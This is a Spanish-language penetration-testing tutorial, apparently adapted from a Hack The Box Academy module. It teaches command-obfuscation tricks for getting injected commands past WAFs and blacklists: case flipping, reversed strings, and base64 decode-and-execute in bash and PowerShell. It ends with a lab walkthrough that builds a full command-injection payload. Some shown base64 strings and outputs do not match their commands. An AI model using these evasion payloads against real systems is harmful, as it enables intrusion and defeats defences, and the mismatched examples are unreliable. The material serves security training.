
# Ofuscación de comandos avanzada

En algunos casos, podemos estar tratando con soluciones de filtrado avanzadas, como firewalls de aplicaciones web (WAF), y las técnicas de evasión básicas pueden no funcionar necesariamente. Podemos utilizar técnicas más avanzadas para tales ocasiones, que hacen que sea mucho menos probable detectar los comandos inyectados.

***

## <mark style="color:purple;">Manipulación de Case</mark>

Una técnica de ofuscación de comandos que podemos utilizar es la manipulación de mayúsculas y minúsculas, como invertir las mayúsculas y minúsculas de los caracteres de un comando (por ejemplo, `WHOAMI`) o alternar entre mayúsculas y minúsculas (por ejemplo, `WhOaMi`). Esto suele funcionar porque una lista negra de comandos puede no comprobar si hay variaciones de mayúsculas y minúsculas en una misma palabra, ya que los sistemas Linux distinguen entre mayúsculas y minúsculas.

Si estamos tratando con un servidor Windows, podemos cambiar las mayúsculas y minúsculas de los caracteres del comando y enviarlo. En Windows, los comandos para PowerShell y CMD no distinguen entre mayúsculas y minúsculas, lo que significa que ejecutarán el comando independientemente de en qué mayúsculas y minúsculas esté escrito:

```powershell
PS C:\afsh4ck> WhOaMi

afsh4ck
```

Sin embargo, cuando se trata de Linux y un shell bash, que distinguen entre mayúsculas y minúsculas, como se mencionó anteriormente, tenemos que ser un poco creativos y encontrar un comando que convierta el comando en una palabra escrita completamente en minúsculas. Un comando que podemos usar es el siguiente:

```shell-session
afsh4ck@kali$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

kali
```

Como podemos ver, el comando funcionó, aunque la palabra que proporcionamos fue ( `WhOaMi`). Este comando `tr` reemplaza todos los caracteres en mayúsculas por minúsculas, lo que da como resultado un comando compuesto únicamente por caracteres en minúsculas. Sin embargo, si intentamos usar el comando anterior con la aplicación web `Host Checker`, veremos que sigue bloqueado:

![Comandos de filtro](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_3.jpg)

Esto se debe a que el comando anterior contiene espacios, que es un carácter filtrado en nuestra aplicación web, como hemos visto antes. Por lo tanto, con tales técnicas, `siempre debemos asegurarnos de no utilizar ningún carácter filtrado`; de lo contrario, nuestras solicitudes fallarán y podemos pensar que las técnicas no funcionaron.

Una vez que reemplazamos los espacios por tabulaciones ( `%09`), vemos que el comando funciona perfectamente:

![Comandos de filtro](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_4.jpg)

Hay muchos otros comandos que podemos usar para el mismo propósito, como los siguientes:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

***

## <mark style="color:purple;">Comandos invertidos</mark>

Otra técnica de ofuscación de comandos que analizaremos es invertir los comandos y tener una plantilla de comandos que los cambie y los ejecute en tiempo real. En este caso, escribiremos `imaohw` en lugar de `whoami` para evitar activar el comando incluido en la lista negra.

Podemos ser creativos con estas técnicas y crear nuestros propios comandos de Linux/Windows que, en última instancia, ejecuten el comando sin incluir nunca las palabras del comando real. Primero, tendríamos que obtener la cadena invertida de nuestro comando en nuestra terminal, de la siguiente manera:

```shell-session
afsh4ck@kali$ echo 'whoami' | rev
imaohw
```

Luego, podemos ejecutar el comando original invirtiéndolo en un sub-shell (`$()`), de la siguiente manera:

```shell-session
afsh4ck@kali$ $(rev<<<'imaohw')

afsh4ck
```

Vemos que, aunque el comando no contiene la palabra exacta `whoami`, funciona de la misma manera y proporciona el resultado esperado. También podemos probar este comando con nuestro ejercicio y, de hecho, funciona:

![Comandos de filtro](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_5.jpg)

{% hint style="info" %}
Consejo: si desea omitir un filtro de caracteres con el método anterior, también deberá revertirlos o incluirlos al revertir el comando original.
{% endhint %}

Lo mismo se puede aplicar en `Windows`. Primero podemos invertir una cadena, de la siguiente manera:

```powershell
PS C:\afsh4ck> "whoami"[-1..-20] -join ''

imaohw
```

Ahora podemos usar el siguiente comando para ejecutar una cadena invertida con un subshell de PowerShell (`iex "$()"`), de la siguiente manera:

```powershell
PS C:\afsh4ck> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

***

## <mark style="color:purple;">Comandos codificados</mark>

La última técnica que analizaremos es útil para los comandos que contienen caracteres filtrados o caracteres que el servidor puede decodificar mediante URL. Esto puede hacer que el comando se estropee cuando llegue al shell y, finalmente, no se pueda ejecutar. En lugar de copiar un comando existente en línea, intentaremos crear nuestro propio comando de ofuscación exclusivo esta vez. De esta manera, es mucho menos probable que un filtro o un WAF lo rechacen. El comando que creemos será exclusivo para cada caso, según los caracteres permitidos y el nivel de seguridad del servidor.

Podemos utilizar varias herramientas de codificación, como `base64`(para codificación b64) o `xxd`(para codificación hexadecimal). Tomemos `base64`como ejemplo. Primero, codificaremos la carga útil que queremos ejecutar (que incluye caracteres filtrados):

```shell-session
afsh4ck@kali$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Ahora podemos crear un comando que decodificará la cadena codificada en un sub-shell (`$()`), y luego la pasará a `bash` para que se ejecute (es decir, `bash<<<`), de la siguiente manera:

```shell-session
afsh4ck@kali$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Como podemos ver, el comando anterior ejecuta el comando a la perfección. No incluimos ningún carácter filtrado y evitamos los caracteres codificados que pueden provocar que el comando no se ejecute.

{% hint style="info" %}
**Consejo**: Ten en cuenta que estamos utilizando `<<<` para evitar el uso de una barra vertical `|`, que es un carácter filtrado.
{% endhint %}

Ahora podemos usar este comando (una vez que reemplazamos los espacios) para ejecutar el mismo comando a través de la inyección de comando:

![Comandos de filtro](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_6.jpg)

Incluso si se filtraran algunos comandos, como `bash` o `base64`, podríamos evitar ese filtro con las técnicas que discutimos en la sección anterior (por ejemplo, inserción de caracteres), o usar otras alternativas como `sh` para la ejecución de comandos y `openssl` para la decodificación b64, o `xxd` para la decodificación hexadecimal.

También utilizamos la misma técnica con Windows. Primero, debemos codificar nuestra cadena en base64, de la siguiente manera:

```powershell
PS C:\afsh4ck> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

YWZzaDRjaw==
```

También podemos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de `utf-8`a `utf-16`antes de `base64`hacerlo, de la siguiente manera:

&#x20; Ofuscación de comandos avanzada

```shell-session
afsh4ck@kali$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

YWZzaDRjaw==
```

Finalmente, podemos decodificar la cadena b64 y ejecutarla con un sub-shell de PowerShell ( `iex "$()"`), de la siguiente manera:

```powershell
PS C:\afsh4ck> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

afsh4ck
```

Como podemos ver, podemos ser creativos con `Bash` o `PowerShell` y crear nuevos métodos de omisión y ofuscación que no se han utilizado antes y, por lo tanto, es muy probable que omitan filtros y WAF. Existen varias herramientas que pueden ayudarnos a ofuscar automáticamente nuestros comandos, lo que analizaremos en la siguiente sección.

Además de las técnicas que hemos comentado, podemos utilizar muchos otros métodos, como comodines, expresiones regulares, redirección de salida, expansión de números enteros y muchos otros. Podemos encontrar algunas de estas técnicas en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion) .

***

## Caso práctico

```
Objetivo: 94.237.63.109:36789
```

Encuentre la salida del siguiente comando usando una de las técnicas que aprendió en esta sección:&#x20;

```bash
find /usr/share/ | grep root | grep mysql | tail -n 1
```

### **Paso 1: Generar una versión ofuscada del comando**

1. **Convertir el comando a Base64**: Primero, codificamos el comando original:

```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

Salida codificada:

```makefile
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

2. **Construir el comando ofuscado**: Usamos Bash para decodificar y ejecutar el comando:

```bash
bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

* Reemplazamos espacios por `%09` (tabulación) y barras `/` por `${PATH:0:1}` si fuera necesario.
* El comando quedaría así:

```bash
bash%09<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

Y el payload final para BurpSuite, añadiendo delante `ip=127.0.0.1%0a`:

```
ip=127.0.0.1%0abash%09<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

<figure><img src="/files/qLVmktDH0KFHjIv3Vnla" alt=""><figcaption></figcaption></figure>

Bingo, el comando se ejecuta perfectamente y evadimos todos los filtros.
